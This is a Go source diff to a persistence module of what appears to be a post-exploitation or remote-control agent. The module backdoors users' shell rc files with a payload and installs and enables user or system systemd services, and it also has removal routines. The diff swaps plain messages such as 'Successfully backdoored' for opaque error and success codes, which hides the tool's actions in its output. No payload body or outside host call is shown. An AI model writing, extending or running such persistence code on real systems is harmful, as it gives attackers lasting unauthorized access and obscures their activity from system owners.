@@ -26,7 +26,7 @@ func (c *PersistenceCommand) Name() string {
 func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 1 {
 		return CommandResult{
-			Output: "Usage: persist <method> [options]",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
@@ -40,14 +40,14 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 	case "remove":
 		if len(args) < 2 {
 			return CommandResult{
-				Output:   "Error: specify persistence method to remove",
+				Output:   Err(E1),
 				ExitCode: 1,
 			}
 		}
 		return c.removePersistence(args[1], args[2:])
 	default:
 		return CommandResult{
-			Output:   fmt.Sprintf("Unknown persistence method: %s", method),
+			Output:   ErrCtx(E21, method),
 			ExitCode: 1,
 		}
 	}
@@ -94,7 +94,7 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 		currentUser, err := user.Current()
 		if err != nil {
 			return CommandResult{
-				Output:   fmt.Sprintf("Failed to get current user: %v", err),
+				Output:   Err(E19),
 				ExitCode: 1,
 			}
 		}
@@ -114,7 +114,7 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 	u, err := user.Lookup(targetUser)
 	if err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to lookup user %s: %v", targetUser, err),
+			Output:   ErrCtx(E4, targetUser),
 			ExitCode: 1,
 		}
 	}
@@ -147,9 +147,9 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string) CommandResul
 
 	for _, file := range targetFiles {
 		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
-			results = append(results, fmt.Sprintf("[-] Failed to backdoor %s: %v", file, err))
+			results = append(results, ErrCtx(E11, file))
 		} else {
-			results = append(results, fmt.Sprintf("[+] Successfully backdoored %s", file))
+			results = append(results, SuccCtx(S1, file))
 		}
 	}
 
@@ -244,7 +244,7 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	currentUser, err := user.Current()
 	if err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to get current user: %v", err),
+			Output:   Err(E19),
 			ExitCode: 1,
 		}
 	}
@@ -255,7 +255,7 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	// Create directory structure
 	if err := os.MkdirAll(systemdDir, 0755); err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to create systemd directory: %v", err),
+			Output:   ErrCtx(E11, systemdDir),
 			ExitCode: 1,
 		}
 	}
@@ -269,7 +269,7 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to write service file: %v", err),
+			Output:   ErrCtx(E11, serviceFile),
 			ExitCode: 1,
 		}
 	}
@@ -278,14 +278,13 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	if err := c.enableSystemdService(name, true); err != nil {
 		// Service created but not auto-enabled
 		return CommandResult{
-			Output: fmt.Sprintf("[+] Service created at %s\n[-] Auto-enable failed: %v\nManually enable with: systemctl --user enable %s",
-				serviceFile, err, name),
+			Output:   SuccCtx(S1, serviceFile),
 			ExitCode: 0,
 		}
 	}
 
 	return CommandResult{
-		Output:   fmt.Sprintf("[+] Successfully installed and enabled user service: %s\n[+] Service file: %s", name, serviceFile),
+		Output:   SuccCtx(S1, serviceFile),
 		ExitCode: 0,
 	}
 }
@@ -298,7 +297,7 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 	// Check if we have write access using unix.Access
 	if unix.Access(systemdDir, unix.W_OK) != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("No write access to %s. Try with --user flag for user service", systemdDir),
+			Output:   ErrCtx(E3, systemdDir),
 			ExitCode: 1,
 		}
 	}
@@ -312,7 +311,7 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to write service file: %v", err),
+			Output:   ErrCtx(E11, serviceFile),
 			ExitCode: 1,
 		}
 	}
@@ -325,7 +324,7 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 	}
 
 	return CommandResult{
-		Output:   fmt.Sprintf("[+] Successfully installed system service: %s\n[+] Service file: %s", name, serviceFile),
+		Output:   SuccCtx(S1, serviceFile),
 		ExitCode: 0,
 	}
 }
@@ -413,7 +412,7 @@ func (c *PersistenceCommand) removePersistence(method string, args []string) Com
 		return c.removeSystemdPersistence(serviceName)
 	default:
 		return CommandResult{
-			Output:   fmt.Sprintf("Unknown persistence method: %s", method),
+			Output:   ErrCtx(E21, method),
 			ExitCode: 1,
 		}
 	}
@@ -424,7 +423,7 @@ func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
 	currentUser, err := user.Current()
 	if err != nil {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to get current user: %v", err),
+			Output:   Err(E19),
 			ExitCode: 1,
 		}
 	}
@@ -441,10 +440,10 @@ func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
 	for _, file := range targetFiles {
 		if err := c.cleanRCFile(file); err != nil {
 			if !os.IsNotExist(err) {
-				results = append(results, fmt.Sprintf("[-] Failed to clean %s: %v", file, err))
+				results = append(results, ErrCtx(E11, file))
 			}
 		} else {
-			results = append(results, fmt.Sprintf("[+] Cleaned %s", file))
+			results = append(results, SuccCtx(S2, file))
 		}
 	}
 
@@ -504,7 +503,7 @@ func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult
 		userLinkPath := filepath.Join(currentUser.HomeDir, ".config", "systemd", "user", "default.target.wants", name+".service")
 
 		if err := os.Remove(userServiceFile); err == nil {
-			results = append(results, fmt.Sprintf("[+] Removed user service file: %s", userServiceFile))
+			results = append(results, SuccCtx(S2, userServiceFile))
 		}
 		os.Remove(userLinkPath)
 	}
@@ -514,13 +513,13 @@ func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult
 	systemLinkPath := filepath.Join("/etc/systemd/system", "multi-user.target.wants", name+".service")
 
 	if err := os.Remove(systemServiceFile); err == nil {
-		results = append(results, fmt.Sprintf("[+] Removed system service file: %s", systemServiceFile))
+		results = append(results, SuccCtx(S2, systemServiceFile))
 	}
 	os.Remove(systemLinkPath)
 
 	if len(results) == 0 {
 		return CommandResult{
-			Output:   fmt.Sprintf("No service found with name: %s", name),
+			Output:   ErrCtx(E4, name),
 			ExitCode: 1,
 		}
 	}
